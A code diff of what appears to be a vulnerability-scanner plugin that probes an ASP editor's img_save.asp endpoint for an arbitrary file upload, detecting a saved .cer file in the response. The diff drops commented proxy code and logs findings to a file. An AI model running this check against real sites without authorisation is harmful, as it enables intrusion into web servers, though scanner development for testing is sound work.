@@ -41,8 +41,6 @@ def medusa(Url,RandomAgent,ProxyIp):
         port = 80
     else:
         port = port
-    global resp
-    global resp2
     try:
         payload = "/library/editornew/Editor/img_save.asp"
         payload_url = scheme + "://" + url +":"+ str(port)+ payload
@@ -90,13 +88,6 @@ def medusa(Url,RandomAgent,ProxyIp):
         }
 
         s = requests.session()
-        # if ProxyIp!=None:
-        #     proxies = {
-        #         # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
-        #         "http": "http://" + str(ProxyIp)
-        #     }
-        #     resp = s.post(payload_url,data=data,headers=headers, timeout=6, proxies=proxies,verify=False)
-        # elif ProxyIp==None:
         resp = s.post(payload_url,data=data,headers=headers, timeout=6, verify=False)
         con = resp.text
         match = re.search(r'getimg\(\'([\d]+.cer)\'\)', con)
@@ -111,7 +102,7 @@ def medusa(Url,RandomAgent,ProxyIp):
                 _t=VulnerabilityInfo(Medusa)
                 web=ClassCongregation.VulnerabilityDetails(_t.info)
                 web.High() # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
-                return (str(Medusa))
+                ClassCongregation.WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
     except Exception:
         _ = VulnerabilityInfo('').info.get('algroup')
         _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名
